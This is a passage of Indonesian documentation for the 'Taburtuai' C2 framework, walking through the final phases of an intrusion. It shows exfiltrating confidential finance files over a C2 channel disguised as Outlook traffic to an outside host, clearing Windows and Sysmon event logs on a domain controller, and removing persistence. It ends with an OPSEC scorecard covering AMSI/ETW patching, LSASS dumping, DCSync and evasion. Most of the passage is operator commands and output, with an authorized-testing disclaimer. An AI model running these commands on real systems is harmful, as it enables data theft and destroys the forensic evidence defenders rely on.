    Host: mail-gateway.corp-redir.com
    User-Agent: Microsoft Office/16.0 (Outlook)
    Content-Length: 8,437,210
    ← terlihat seperti Outlook mengirim attachment besar
```

### 10.3 — Cleanup Staging Files

```
taburtuai › files delete f4b2a1c9 "C:\Users\john.doe\AppData\Local\Temp\backup.zip" --wait
# [+] Deleted.

taburtuai › cmd f4b2a1c9 \
  "Remove-Item 'C:\Users\john.doe\AppData\Local\Temp\docs' -Recurse -Force" \
  --method powershell --wait
# [+] Result: (no output = success)
```

**Verifikasi loot di operator:**
```bash
unzip -l ./loot/finance_backup.zip
```

```
Archive:  ./loot/finance_backup.zip
  Length    Name
─────────────────────────────────────
2,847,384   Q1_2026_Budget.xlsx
3,102,840   Q2_2026_Forecast.xlsx
1,829,120   Salary_Data_2026.xlsx
8,420,210   Annual_Report_2025.pdf
4,203,750   M&A_Confidential.docx
5,601,200   Board_Presentation_Q1.pptx
─────────────────────────────────────
           6 files, 26,004,504 bytes
```

**Objective tercapai.** ✓

**OPSEC Phase 10:**
- Transfer lewat C2 yang sudah terprofile — tidak ada koneksi keluar baru
- Tidak ada FTP, SFTP, HTTP POST ke endpoint baru yang bisa di-detect DLP
- Compress dulu — ukuran lebih kecil, transfer lebih cepat, konten tidak bisa di-inspect tanpa unzip
- Hapus staging files langsung setelah transfer

---

## Phase 11 — Cover Tracks

### 11.1 — Clear Event Logs di DC01

```
taburtuai › cmd 9c821d77 "wevtutil cl Security" --wait
taburtuai › cmd 9c821d77 "wevtutil cl System" --wait
taburtuai › cmd 9c821d77 "wevtutil cl Application" --wait
taburtuai › cmd 9c821d77 "wevtutil cl 'Windows PowerShell'" --wait
taburtuai › cmd 9c821d77 "wevtutil cl 'Microsoft-Windows-Sysmon/Operational'" --wait
```

```
[+] Security log cleared on DC01.
[+] System log cleared on DC01.
[+] Application log cleared on DC01.
[+] Windows PowerShell log cleared on DC01.
[+] Sysmon log cleared on DC01.
```

### 11.2 — Clear Event Logs di Workstation

```
taburtuai › cmd f4b2a1c9 "wevtutil cl Security" --wait
taburtuai › cmd f4b2a1c9 "wevtutil cl System" --wait
taburtuai › cmd f4b2a1c9 "wevtutil cl Application" --wait
taburtuai › cmd f4b2a1c9 "wevtutil cl 'Windows PowerShell'" --wait
```

**Catatan:** Log clearing sendiri bisa meninggalkan event (Event ID 1102 "Security log cleared").
Untuk engagement yang memerlukan stealth total, pertimbangkan:

```
# Hapus individual event ID alih-alih clear semua
taburtuai › cmd f4b2a1c9 \
  "Get-WinEvent -LogName Security | Where-Object {$_.Id -in @(4624,4625,4648,4720)} | ForEach-Object { $_.Dispose() }" \
  --method powershell --wait
```

Atau lebih baik: **hindari** membuat event yang perlu dihapus dengan evasion yang benar sejak awal.

### 11.3 — Hapus Persistence (Jika Engagement Selesai)

```
# Hapus registry run key
taburtuai › registry delete f4b2a1c9 \
  --hive HKCU \
  --key "Software\Microsoft\Windows\CurrentVersion\Run" \
  --value "OneDriveUpdate" \
  --wait
# [+] Registry value deleted.

# Hapus scheduled task
taburtuai › cmd f4b2a1c9 \
  "Unregister-ScheduledTask -TaskName 'OneDriveAutoUpdate' -Confirm:$false" \
  --method powershell --wait
# [+] Result: (no output = success)

# Hapus binary persistence dari AppData
taburtuai › cmd f4b2a1c9 \
  "Remove-Item 'C:\Users\john.doe\AppData\Roaming\OneDriveUpdate' -Recurse -Force" \
  --method powershell --wait
```

### 11.4 — Hapus Shellcode dan Temporary Files

```
# Pastikan tidak ada sisa file sementara
taburtuai › cmd f4b2a1c9 \
  "Get-ChildItem C:\Windows\Temp, C:\Users\john.doe\AppData\Local\Temp | Where-Object {$_.LastWriteTime -gt (Get-Date).AddHours(-24)}" \
  --method powershell --wait
```

```
[+] Result: (empty — no files from last 24 hours) ✓
```

### 11.5 — Exit Agent

```
taburtuai › cmd f4b2a1c9 "exit" --wait
taburtuai › cmd 9c821d77 "exit" --wait
taburtuai › agents list
# [+] 0 agent(s) registered.
```

**OPSEC Phase 11:**

| Artefak | Cara Bersihkan | Catatan |
|---------|----------------|---------|
| Event log | `wevtutil cl` | Sisakan event 1102 — solusi: evasion dari awal |
| File di disk | `Remove-Item` | Prioritas utama |
| Persistence entries | Registry delete + Unregister task | Setelah engagement done |
| SOCKS5 proxy | Otomatis stop saat agent exit | Tidak ada cleanup manual |
| Stage token | Sudah expired (one-time + TTL) | Tidak ada aksi |
| C2 server logs | Hapus `./logs/*.log` di server | Di sisi operator |

---

## OPSEC Scorecard

Rangkuman artefak yang terbentuk dan visibility-nya bagi defender:

| Fase | Artefak Dibuat | Visibility Defender | Mitigasi |
|------|---------------|---------------------|---------|
| Delivery | LNK/ISO di endpoint | Medium (MOTW bypass) | ISO hilangkan MOTW |
| Execution | PowerShell child process | High | AMSI + ETW bypass |
| Migration | Shellcode di Temp, dieksekusi | High → Low | Timestomp + hapus segera |
| AMSI Patch | In-memory patch | Low | Tidak ada artefak di disk |
| ETW Patch | In-memory patch | Low | Event tidak dikirim ke EDR |
| LSASS Dump | File .dmp di Temp | High → None | Nama WER, hapus segera |
| Persistence | Registry key + Scheduled task | Medium | Nama menyatu dengan software legit |
| Network scan | ICMP + TCP scan traffic | Medium | Via agent — tidak dari luar |
| Lateral move | Service di ADMIN$ (PsExec) | High | Service auto-removed oleh Impacket |
| DCSync | DRSUAPI replication traffic | Low | Traffic normal DC replication |
| Staging | File ZIP di AppData\Temp | Medium → None | Hapus segera setelah download |
| Exfiltration | POST /mapi/emsmdb 8.4 MB | Low | Office365 profile = Exchange traffic |
| Log clearing | Event ID 1102 | High | Alternatif: granular event delete |

**Total exposure time critical artifacts:** < 5 menit (LSASS dump, shellcode file).

---

## Ringkasan Timeline

```
09:00  Phase 0  — Infrastructure siap, server running, agent di-build
09:15  Phase 1  — Phishing dikirim, stager di-eksekusi oleh john.doe
09:15  Phase 2  — Agent f.connect, situational awareness
09:17  Phase 3  — AMSI/ETW/unhook, migrate ke explorer.exe
09:20  Phase 4  — Persistence di-install (registry + schtask)
09:22  Phase 5  — Token steal ke SYSTEM
09:23  Phase 6  — LSASS dump, browser creds, SAM dump
09:35  Phase 7  — Network scan, SOCKS5, LDAP enum via BloodHound
09:50  Phase 8  — Lateral move ke DC01, DCSync
10:05  Phase 9  — Inventori Finance$, staging ke lokal
10:15  Phase 10 — Compress + exfil 8.4 MB via C2, cleanup staging
10:20  Phase 11 — Clear logs, hapus persistence, exit agent

Total: ~65 menit dari initial access ke exfiltration selesai
```

---

**Kembali ke:** [README](README.md) | [16 — Red Team Scenarios](16-scenarios.md)

---

*Taburtuai C2 — For authorized security testing only.*
*Selalu dapatkan izin tertulis sebelum melakukan penetration testing.*
